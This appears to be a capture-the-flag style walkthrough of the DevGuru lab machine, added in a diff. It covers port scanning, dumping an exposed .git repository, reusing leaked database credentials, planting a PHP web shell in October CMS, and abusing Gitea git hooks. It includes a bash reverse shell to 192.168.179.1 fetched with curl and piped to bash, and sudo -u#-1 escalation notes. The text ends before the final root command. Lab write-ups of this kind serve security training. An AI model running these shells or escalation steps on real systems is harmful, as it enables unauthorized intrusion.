@@ -1,0 +1,470 @@
+I"ڏ<p>This machine was created by <strong>Zayotic</strong>, it’s a fictional web development company hiring you for a pentest assessment. You have been tasked with finding vulnerabilities on their corporate website and obtaining root.</p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discover">Host Discover</h3>
+
+<p>The machine was located on the ocal network with a ping scan, the script you can find it <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/devguru<span class="nv">$ </span>hdiscovery.py <span class="nt">-t</span> 192.168.179.0/24
+192.168.179.166 is alive
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>A full TCP port scan with nmap discovered three available ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/devguru<span class="nv">$ </span>nmap <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-p1-65535</span> <span class="nt">-n</span> 192.168.179.166 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
+...
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8585/tcp open  unknown
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<p>An aggressive scan was performed against the target that allows version enumeration, OS detection, script scanning and traceroute.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/devguru<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-A</span> <span class="nt">-p22</span>,80,8585 192.168.179.166 <span class="nt">-oN</span> nmap/service-enum.txt
+...
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   2048 2a:46:e8:2b:01:ff:57:58:7a:5f:25:a4:d6:f2:89:8e <span class="o">(</span>RSA<span class="o">)</span>
+|   256 08:79:93:9c:e3:b4:a4:be:80:ad:61:9d:d3:88:d2:84 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 9c:f9:88:d4:33:77:06:4e:d9:7c:39:17:3e:07:9c:bd <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-generator: DevGuru
+| http-git:
+|   192.168.179.166:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository<span class="p">;</span> edit this file <span class="s1">'description'</span> to name the...
+|     Last commit message: first commit
+|     Remotes:
+|       http://devguru.local:8585/frank/devguru-website.git
+|_    Project <span class="nb">type</span>: PHP application <span class="o">(</span>guessed from .gitignore<span class="o">)</span>
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Corp - DevGuru
+8585/tcp open  unknown
+| fingerprint-strings:
+|   GenericLines:
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+|     Connection: close
+|     Request
+|   GetRequest:
+|     HTTP/1.0 200 OK
+|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+|     Set-Cookie: <span class="nv">lang</span><span class="o">=</span>en-US<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> Max-Age<span class="o">=</span>2147483647
+|     Set-Cookie: <span class="nv">i_like_gitea</span><span class="o">=</span>40bce59ebd747dc9<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly
+|     Set-Cookie: <span class="nv">_csrf</span><span class="o">=</span>bOt6t6idJjRQDG0jIqmcoj6NVP06MTYzNzgwOTk3NjI3NTU0NDcwNw<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> <span class="nv">Expires</span><span class="o">=</span>Fri, 26 Nov 2021 03:12:56 GMT<span class="p">;</span> HttpOnly
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Thu, 25 Nov 2021 03:12:56 GMT
+|     &lt;<span class="o">!</span>DOCTYPE html&gt;
+|     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en-US"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"theme-"</span><span class="o">&gt;</span>
+|     &lt;<span class="nb">head </span>data-suburl<span class="o">=</span><span class="s2">""</span><span class="o">&gt;</span>
+|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
+|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1"</span><span class="o">&gt;</span>
+|     &lt;meta http-equiv<span class="o">=</span><span class="s2">"x-ua-compatible"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"ie=edge"</span><span class="o">&gt;</span>
+|     &lt;title&gt; Gitea: Git with a cup of tea &lt;/title&gt;
+|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"manifest"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/manifest.json"</span> <span class="nv">crossorigin</span><span class="o">=</span><span class="s2">"use-credentials"</span><span class="o">&gt;</span>
+|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"theme-color"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"#6cc644"</span><span class="o">&gt;</span>
+|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"author"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"Gitea - Git with a cup of tea"</span> /&gt;
+|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"description"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"Gitea (Git with a cup of tea) is a painless
+|   HTTPOptions:
+|     HTTP/1.0 404 Not Found
+|     Content-Type: text/html; charset=UTF-8
+|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
+|     Set-Cookie: i_like_gitea=7710e8fb443c87f3; Path=/; HttpOnly
+|     Set-Cookie: _csrf=ySgqKGOhEJ54SFeZh3FcsSaxhU06MTYzNzgwOTk3NjU5NTMwNjAxOQ; Path=/; Expires=Fri, 26 Nov 2021 03:12:56 GMT; HttpOnly
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Thu, 25 Nov 2021 03:12:56 GMT
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang="</span>en-US<span class="s2">" class="</span>theme-<span class="s2">"&gt;
+|     &lt;head data-suburl=""&gt;
+|     &lt;meta charset="</span>utf-8<span class="s2">"&gt;
+|     &lt;meta name="</span>viewport<span class="s2">" content="</span><span class="nv">width</span><span class="o">=</span>device-width, initial-scale<span class="o">=</span>1<span class="s2">"&gt;
+|     &lt;meta http-equiv="</span>x-ua-compatible<span class="s2">" content="</span><span class="nv">ie</span><span class="o">=</span>edge<span class="s2">"&gt;
+|     &lt;title&gt;Page Not Found - Gitea: Git with a cup of tea &lt;/title&gt;
+|     &lt;link rel="</span>manifest<span class="s2">" href="</span>/manifest.json<span class="s2">" crossorigin="</span>use-credentials<span class="s2">"&gt;
+|     &lt;meta name="</span>theme-color<span class="s2">" content="</span><span class="c">#6cc644"&gt;</span>
+|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"author"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"Gitea - Git with a cup of tea"</span> /&gt;
+|_    &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"description"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"Gitea (Git with a c
+</span></code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p><strong>Enumerating Service on port 80</strong></p>
+
+<p>Visiting the web application in its home page was not possible find any valuable information.</p>
+
+<p><img src="/assets/images/devguru/screenshot-1.png" alt="" /></p>
+
+<p>Running gobuster will allow us to discover hidden information in the web directories.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/devguru<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://devguru.local <span class="nt">-w</span> /usr/share/dirb/wordlists/common.txt <span class="nt">-e</span> 2&gt;/dev/null
+...
+http://devguru.local/.git/HEAD            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 23]
+http://devguru.local/.htaccess            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1678]
+http://devguru.local/0                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 12669]
+http://devguru.local/about                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 18661]
+http://devguru.local/About                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 18661]
+http://devguru.local/backend              <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 410] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://devguru.local/backend/backend/auth]
+http://devguru.local/config               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 315] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://devguru.local/config/]             
+http://devguru.local/modules              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://devguru.local/modules/]            
+http://devguru.local/plugins              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://devguru.local/plugins/]            
+http://devguru.local/storage              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://devguru.local/storage/]            
+http://devguru.local/themes               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 315] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://devguru.local/themes/]             
+http://devguru.local/vendor               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 315] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://devguru.local/vendor/]
+</code></pre></div></div>
+
+<p>An interesting git directory was located exposed, we will cover that later.</p>
+
+<p><strong>Enumerating service on port 8585</strong></p>
+
+<p>The service running on port 8585 is Gitea, it’s a lightweight code hosting solution written in Go, also the version of this product is vulnerable to Remote Code Execution Authenticated.</p>
+
+<p><img src="/assets/images/devguru/screenshot-2.png" alt="" /></p>
+
+<p><img src="/assets/images/devguru/screenshot-3.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/devguru<span class="nv">$ </span>searchsploit Gitea 1.12.5
+<span class="nt">-----------------------------------------------------------------------</span> <span class="nt">-----------------------------</span>
+ Exploit Title                                                         |  Path
+<span class="nt">-----------------------------------------------------------------------</span> <span class="nt">-----------------------------</span>
+Gitea 1.12.5 - Remote Code Execution <span class="o">(</span>Authenticated<span class="o">)</span>                   | multiple/webapps/49571.py
+<span class="nt">-----------------------------------------------------------------------</span> <span class="nt">-----------------------------</span>
+</code></pre></div></div>
+
+<p>A user named frank was identified.</p>
+
+<p><img src="/assets/images/devguru/screenshot-4.png" alt="" /></p>
+
+<p>Going back to the web application on port 80, an exposed .git repository was detected, to fetch that directory from the target web server we will use GitTools.</p>
+
+<p>We download it from the following repository:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/devguru<span class="nv">$ </span>git clone https://github.com/internetwache/GitTools.git
+</code></pre></div></div>
+
+<p>We run the following command to dump it to our machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/devguru<span class="nv">$ </span>GitTools/Dumper/gitdumper.sh http://192.168.179.166/.git/ <span class="nb">.</span>   
+<span class="c">###########                                                                       </span>
+<span class="c"># GitDumper is part of https://github.com/internetwache/GitTools         </span>
+<span class="c">#                                                                                 </span>
+<span class="c"># Developed and maintained by @gehaxelt from @internetwache                       </span>
+<span class="c">#                                                                                 </span>
+<span class="c"># Use at your own risk. Usage might be illegal in certain circumstances.          </span>
+<span class="c"># Only for educational purposes!                                                  </span>
+<span class="c">###########                                                                       </span>
+
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Destination folder does not exist
+<span class="o">[</span>+] Creating ./.git/
+<span class="o">[</span>+] Downloaded: HEAD
+<span class="o">[</span>-] Downloaded: objects/info/packs
+<span class="o">[</span>+] Downloaded: description
+<span class="o">[</span>+] Downloaded: config
+<span class="o">[</span>+] Downloaded: COMMIT_EDITMSG
+<span class="o">[</span>+] Downloaded: index
+<span class="o">[</span>-] Downloaded: packed-refs
+<span class="o">[</span>+] Downloaded: refs/heads/master
+<span class="o">[</span>-] Downloaded: refs/remotes/origin/HEAD
+<span class="o">[</span>-] Downloaded: refs/stash
+<span class="o">[</span>+] Downloaded: logs/HEAD
+<span class="o">[</span>+] Downloaded: logs/refs/heads/master
+...
+</code></pre></div></div>
+
+<p>Then we extract the information from downloaded .git directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/devguru<span class="nv">$ </span>GitTools/Extractor/extractor.sh ./ extracted_git
+<span class="c">###########</span>
+<span class="c"># Extractor is part of https://github.com/internetwache/GitTools</span>
+<span class="c">#</span>
+<span class="c"># Developed and maintained by @gehaxelt from @internetwache</span>
+<span class="c">#</span>
+<span class="c"># Use at your own risk. Usage might be illegal in certain circumstances.</span>
+<span class="c"># Only for educational purposes!</span>
+<span class="c">###########</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Destination folder does not exist
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating...
+<span class="o">[</span>+] Found commit: 7de9115700c5656c670b34987c6fbffd39d90cf2
+<span class="o">[</span>+] Found file: /root/devguru/extracted_git/0-7de9115700c5656c670b34987c6fbffd39d90cf2/.gitignore
+<span class="o">[</span>+] Found file: /root/devguru/extracted_git/0-7de9115700c5656c670b34987c6fbffd39d90cf2/.htaccess
+<span class="o">[</span>+] Found file: /root/devguru/extracted_git/0-7de9115700c5656c670b34987c6fbffd39d90cf2/README.md
+<span class="o">[</span>+] Found file: /root/devguru/extracted_git/0-7de9115700c5656c670b34987c6fbffd39d90cf2/adminer.php
+...
+</code></pre></div></div>
+
+<p>With the tree command we list the content of the extracted_git directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/devguru<span class="nv">$ </span><span class="nb">cd </span>extracted_git 
+root@kali:~/devguru/extracted_git<span class="nv">$ </span>tree
+<span class="nb">.</span>
+└── 0-7de9115700c5656c670b34987c6fbffd39d90cf2
+    ├── adminer.php
+    ├── artisan
+    ├── bootstrap
+    │   ├── app.php
+    │   └── autoload.php
+    ├── commit-meta.txt
+    ├── config
+    │   ├── app.php
+    │   ├── auth.php
+    │   ├── broadcasting.php
+    │   ├── cache.php
+    │   ├── cms.php
+    │   ├── cookie.php
+    │   ├── database.php
+    │   ├── environment.php
+...
+</code></pre></div></div>
+
+<p>We can see an interesting file called database.php, It contains the credentials to the <strong>octoberdb</strong> database</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/devguru/extracted_git<span class="nv">$ </span><span class="nb">cat </span>0-7de9115700c5656c670b34987c6fbffd39d90cf2/config/database.php
+...
+        <span class="s1">'mysql'</span> <span class="o">=&gt;</span> <span class="o">[</span>                                                                                                                                                
+            <span class="s1">'driver'</span>     <span class="o">=&gt;</span> <span class="s1">'mysql'</span>,                                                                                                                                
+            <span class="s1">'engine'</span>     <span class="o">=&gt;</span> <span class="s1">'InnoDB'</span>,                                                                                                                               
+            <span class="s1">'host'</span>       <span class="o">=&gt;</span> <span class="s1">'localhost'</span>,                                                                                                                            
+            <span class="s1">'port'</span>       <span class="o">=&gt;</span> 3306,                                                                                                                                   
+            <span class="s1">'database'</span>   <span class="o">=&gt;</span> <span class="s1">'octoberdb'</span>,                                                                                                                            
+            <span class="s1">'username'</span>   <span class="o">=&gt;</span> <span class="s1">'october'</span>,                                                                                                                              
+            <span class="s1">'password'</span>   <span class="o">=&gt;</span> <span class="s1">'SQ66EBYx4GT3byXH'</span>,                                                                                                                     
+            <span class="s1">'charset'</span>    <span class="o">=&gt;</span> <span class="s1">'utf8mb4'</span>,                                                                                                                              
+            <span class="s1">'collation'</span>  <span class="o">=&gt;</span> <span class="s1">'utf8mb4_unicode_ci'</span>,                                                                                                                   
+            <span class="s1">'prefix'</span>     <span class="o">=&gt;</span> <span class="s1">''</span>,                                                                                                                                     
+            <span class="s1">'varcharmax'</span> <span class="o">=&gt;</span> 191,                                                                                                                                    
+        <span class="o">]</span>,
+...
+</code></pre></div></div>
+
+<p>We can access via adminer, is a full-featured database management tool written in PHP.</p>
+
+<p><img src="/assets/images/devguru/screenshot-5.png" alt="" /></p>
+
+<p>Below are the October CMS login credentials.</p>
+
+<p><img src="/assets/images/devguru/screenshot-6.png" alt="" /></p>
+
+<p>To identify the password hash we can do it with hashid, I tried to crack it but it wasn’t possible.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/devguru<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'$2y$10$bp5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3x8eAaYgN6EKK'</span> | hashid
+Analyzing <span class="s1">'$2y$10$bp5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3x8eAaYgN6EKK'</span>
+<span class="o">[</span>+] Blowfish<span class="o">(</span>OpenBSD<span class="o">)</span> 
+<span class="o">[</span>+] Woltlab Burning Board 4.x 
+<span class="o">[</span>+] bcrypt
+</code></pre></div></div>
+
+<p>So I found another way, create another user in this case was possible to clone user frank, first we need to generate a password hash bcrypt.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/devguru<span class="nv">$ </span>php <span class="nt">-r</span> <span class="s1">'echo password_hash("messier31", PASSWORD_DEFAULT)."\n";'</span>
+<span class="nv">$2y$10$FLTKOyd</span>.fTxu13NW6D/kWOx3ZcvUloXp4gu8/lM2X86qAFttd2JAm
+</code></pre></div></div>
+
+<p>Then modify the fields login, email, and password as shown below:</p>
+
+<p><img src="/assets/images/devguru/screenshot-7.png" alt="" /></p>
+
+<p><img src="/assets/images/devguru/screenshot-8.png" alt="" /></p>
+
+<p>Login to October CMS with the user created above.</p>
+
+<p><img src="/assets/images/devguru/screenshot-9.png" alt="" /></p>
+
+<p><img src="/assets/images/devguru/screenshot-10.png" alt="" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="october-code-execution">October Code Execution</h3>
+
+<p>We can abuse of October CMS feature to run PHP code and execute system commands, below I created a new page that allow me pass the commands as parameters to the system function.</p>
+
+<p><img src="/assets/images/devguru/screenshot-11.png" alt="" /></p>
+
+<p>The id command was executed.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/devguru<span class="nv">$ </span>curl <span class="nt">-s</span> http://devguru.local/shell?cmd<span class="o">=</span><span class="nb">id                               
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</code></pre></div></div>
+
+<p>I wrote a bash reverse shell in the shell.sh file and started a web server on port 80.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/devguru<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'/bin/bash -c "bash -i &gt;&amp; /dev/tcp/192.168.179.1/443 0&gt;&amp;1"'</span> <span class="o">&gt;</span> shell.sh
+
+root@kali:~/devguru<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<p>Start a netcat listener and run the following curl instruction.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/devguru<span class="nv">$ </span>curl <span class="nt">-s</span> http://devguru.local/shell?cmd<span class="o">=</span><span class="si">$(</span>php <span class="nt">-r</span> <span class="s2">"echo urlencode('curl 192.168.179.1/shell.sh | bash');"</span><span class="si">)</span>
+</code></pre></div></div>
+
+<p>We have a reverse shell with www-data privileges and we upgrade it to a full tty shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/devguru<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.166] 54394
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>974<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@devguru:/var/www/html<span class="nv">$ </span>^Z
+zsh: suspended  nc <span class="nt">-vlnp</span> 443
+root@kali:~/devguru<span class="nv">$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg</span>
+<span class="o">[</span>1]  + continued  nc <span class="nt">-vlnp</span> 443
+
+www-data@devguru:/var/www/html<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+www-data@devguru:/var/www/html<span class="nv">$ </span><span class="nb">stty </span>rows 39 columns 164
+</code></pre></div></div>
+
+<p>By listing the processes we can see that gitea is running with frank privileges, the possible way to gain access as frank user.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@devguru:/opt<span class="nv">$ </span>ps aux | <span class="nb">grep </span>frank
+frank      614  4.6 26.0 1442108 128508 ?      Ssl  07:05   0:07 /usr/local/bin/gitea web <span class="nt">--config</span> /etc/gitea/app.ini
+</code></pre></div></div>
+
+<p>Listing files that belongs to user frank.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@devguru:/opt<span class="nv">$ </span>find / <span class="nt">-user</span> frank <span class="nt">-type</span> f 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'proc\|sys'</span>
+/var/backups/app.ini.bak                                                          
+/usr/local/bin/gitea
+</code></pre></div></div>
+
+<p>Digging into the buckup file, the credentials for the gitea database were found.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@devguru:/opt<span class="nv">$ </span><span class="nb">cat</span> /var/backups/app.ini.bak
+...
+<span class="o">[</span>database]
+<span class="p">;</span> Database to use. Either <span class="s2">"mysql"</span>, <span class="s2">"postgres"</span>, <span class="s2">"mssql"</span> or <span class="s2">"sqlite3"</span><span class="nb">.</span>
+DB_TYPE             <span class="o">=</span> mysql
+HOST                <span class="o">=</span> 127.0.0.1:3306
+NAME                <span class="o">=</span> gitea
+USER                <span class="o">=</span> gitea
+<span class="p">;</span> Use PASSWD <span class="o">=</span> <span class="sb">`</span>your password<span class="sb">`</span> <span class="k">for </span>quoting <span class="k">if </span>you use special characters <span class="k">in </span>the password.
+PASSWD              <span class="o">=</span> UfFPTF8C8jjxVF2m
+...
+</code></pre></div></div>
+
+<p>I logged in via adminer to the gitea database.</p>
+
+<p><img src="/assets/images/devguru/screenshot-12.png" alt="" /></p>
+
+<p>This contains to user frank with a different password hash, googling the <a href="https://docs.gitea.io/en-us/config-cheat-sheet/">gitea</a> docs, I found the format of allowed hashing algorithms, one of them is bcrypt so we can reuse the previously generated hash, and we use the clone utility to create a user similar to frank.</p>
+
+<p><img src="/assets/images/devguru/screenshot-13.png" alt="" /></p>
+
+<p>Login as the new user created before.</p>
+
+<p><img src="/assets/images/devguru/screenshot-14.png" alt="" /></p>
+
+<p><img src="/assets/images/devguru/screenshot-15.png" alt="" /></p>
+
+<p><img src="/assets/images/devguru/screenshot-16.png" alt="" /></p>
+
+<p>You can find the complete guide about how to exploit this vulnerability <a href="https://podalirius.net/en/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/">here</a>.</p>
+
+<p>First we need to create a repository.</p>
+
+<p><img src="/assets/images/devguru/screenshot-17.png" alt="" /></p>
+
+<p><img src="/assets/images/devguru/screenshot-18.png" alt="" /></p>
+
+<p>Then go to <strong>Settings -&gt; Git Hooks -&gt; Post Receive Hook,</strong> and write a shell script that will be executed after receiving a new commit.</p>
+
+<p><img src="/assets/images/devguru/screenshot-19.png" alt="" /></p>
+
+<p>Start a netcat listener and run the following commands on the attacking machine to get our reverse shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/devguru<span class="nv">$ </span><span class="nb">touch </span>README.md                                                                                                                                
+root@kali:~/devguru<span class="nv">$ </span>git init 
+root@kali:~/devguru<span class="nv">$ </span>git add README.md
+root@kali:~/devguru<span class="nv">$ </span>git commit <span class="nt">-m</span> <span class="s2">"first commit"</span>
+<span class="o">[</span>master <span class="o">(</span>root-commit<span class="o">)</span> 977f570] first commit
+ 1 file changed, 0 insertions<span class="o">(</span>+<span class="o">)</span>, 0 deletions<span class="o">(</span>-<span class="o">)</span>
+ create mode 100644 README.md
+root@kali:~/devguru<span class="nv">$ </span>git remote add origin http://devguru.local:8585/s4rgaz/Test.git
+root@kali:~/devguru<span class="nv">$ </span>git push <span class="nt">-u</span> origin master
+Username <span class="k">for</span> <span class="s1">'http://devguru.local:8585'</span>: s4rgaz
+Password <span class="k">for</span> <span class="s1">'http://s4rgaz@devguru.local:8585'</span>: 
+Enumerating objects: 3, <span class="k">done</span><span class="nb">.</span>
+Counting objects: 100% <span class="o">(</span>3/3<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+Writing objects: 100% <span class="o">(</span>3/3<span class="o">)</span>, 210 bytes | 210.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
+Total 3 <span class="o">(</span>delta 0<span class="o">)</span>, reused 0 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 0
+remote: <span class="nb">.</span> Processing 1 references
+remote: Processed 1 references <span class="k">in </span>total
+To http://devguru.local:8585/s4rgaz/Test.git
+ <span class="k">*</span> <span class="o">[</span>new branch]      master -&gt; master
+Branch <span class="s1">'master'</span> <span class="nb">set </span>up to track remote branch <span class="s1">'master'</span> from <span class="s1">'origin'</span><span class="nb">.</span>
+</code></pre></div></div>
+
+<p>Now we have a shell with frank’s privileges.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/devguru<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.166] 56758
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>600<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+frank@devguru:~/gitea-repositories/s4rgaz/test.git<span class="nv">$ </span><span class="nb">id
+</span>frank@devguru:~/gitea-repositories/s4rgaz/test.git<span class="nv">$ </span>script <span class="nt">-qc</span> /bin/bash /dev/null
+&lt;ies/s4rgaz/test.git<span class="nv">$ </span>script <span class="nt">-qc</span> /bin/bash /dev/null
+frank@devguru:~/gitea-repositories/s4rgaz/test.git<span class="err">$</span>
+</code></pre></div></div>
+
+<p>By listing sudo permissions we cannot execute sqlite3 as root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frank@devguru:~/gitea-repositories/s4rgaz/test.git<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>frank on devguru:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User frank may run the following commands on devguru:
+    <span class="o">(</span>ALL, <span class="o">!</span>root<span class="o">)</span> NOPASSWD: /usr/bin/sqlite3
+</code></pre></div></div>
+
+<p>A vulnerability exists regarding this setting in versions of sudo prior to 1.8.28, we can check it by consulting the version of sudo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frank@devguru:~/gitea-repositories/s4rgaz/test.git<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">--version</span>
+<span class="nb">sudo</span> <span class="nt">--version</span>
+Sudo version 1.8.21p2
+Sudoers policy plugin version 1.8.21p2
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.21p2
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="sudo-security-bypass">Sudo Security Bypass</h3>
+
+<p>As we can see the current version of sudo is vulnerable because doesn’t check for the existence of the specified user id and executes with arbitrary user id with the sudo priv -u#-1 returns as 0 which is root’s id.</p>
+
+<p>To bypass these restrictions I was guided in the <a href="https://gtfobins.github.io/gtfobins/sqlite3/#sudo">GTFOBINS</a> article, so I used the following instruction to get root.</p>
+
